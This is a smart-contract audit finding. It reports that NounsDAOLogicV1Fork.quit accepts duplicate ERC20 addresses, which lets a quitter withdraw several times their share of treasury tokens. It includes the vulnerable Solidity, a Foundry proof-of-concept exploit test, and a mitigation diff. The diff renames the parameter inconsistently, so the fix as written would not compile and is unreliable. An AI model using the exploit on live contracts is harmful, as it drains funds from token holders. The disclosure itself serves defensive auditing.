## Tags

- bug
- 3 (High Risk)
- high quality report
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- upgraded by judge
- H-01

# [User can steal tokens by using duplicated ERC20 tokens as parameter in NounsDAOLogicV1Fork.quit](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102) 

# Lines of code

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216


# Vulnerability details

## Impact
Calling [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216) by using dupliated ERC20 tokens, malicious user can gain more ERC20 tokens than he/she is supposed to, even drain all ERC20 tokens

## Proof of Concept
In function, [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216), `erc20TokensToInclude` is used to specified tokens a user wants to get, but since the function doesn't verify if `erc20TokensToInclude` contains dupliated tokens, it's possible that a malicious user calls the function by specify the ERC20 more than once to get more share tokens
```solidity
    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {
        // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`
        address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;
        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
            if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {
                revert TokensMustBeASubsetOfWhitelistedTokens();
            }
        }

        quitInternal(tokenIds, erc20TokensToInclude);
    }

    function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {
        checkGovernanceActive();

        uint256 totalSupply = adjustedTotalSupply();

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);
        }

        uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);

        // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.
        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;
        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
            IERC20 erc20token = IERC20(erc20TokensToInclude[i]);
            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;
        }

        // Send ETH and ERC20 tokens
        timelock.sendETH(payable(msg.sender), ethToSend);
        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
            if (balancesToSend[i] > 0) {
                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);
            }
        }

        emit Quit(msg.sender, tokenIds);
    }
```

Add the following code in test/foundry/governance/fork/NounsDAOLogicV1Fork.t.sol file `NounsDAOLogicV1Fork_Quit_Test` contract,
and run `forge test --ffi --mt test_quit_allowsChoosingErc20TokensToIncludeTwice`
```solidity
    function test_quit_allowsChoosingErc20TokensToIncludeTwice() public {
        vm.prank(quitter);
        address[] memory tokensToInclude = new address[](3);
        //****************************
        // specify token2 three times
        //****************************
        tokensToInclude[0] = address(token2);
        tokensToInclude[1] = address(token2);
        tokensToInclude[2] = address(token2);
        dao.quit(quitterTokens, tokensToInclude);

        assertEq(quitter.balance, 24 ether);
        assertEq(token1.balanceOf(quitter), 0);
        //****************************
        // get 3 time tokens
        //****************************
        assertEq(token2.balanceOf(quitter), 3 * (TOKEN2_BALANCE * 2) / 10);
     }
```

## Tools Used
VS

## Recommended Mitigation Steps
By using function `checkForDuplicates` to prevent the issue
```diff
--- NounsDAOLogicV1Fork.sol	2023-07-12 21:32:56.925848531 +0800
+++ NounsDAOLogicV1ForkNew.sol	2023-07-12 21:32:34.006158294 +0800
@@ -203,8 +203,9 @@
         quitInternal(tokenIds, erc20TokensToIncludeInQuit);
     }
 
-    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {
+    function quit(uint256[] calldata tokenIds, address[] memory erc20tokenstoinclude) external nonReentrant {
         // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`
+        checkForDuplicates(erc20tokenstoinclude);
         address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;
         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
             if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {

```


## Assessed type

Other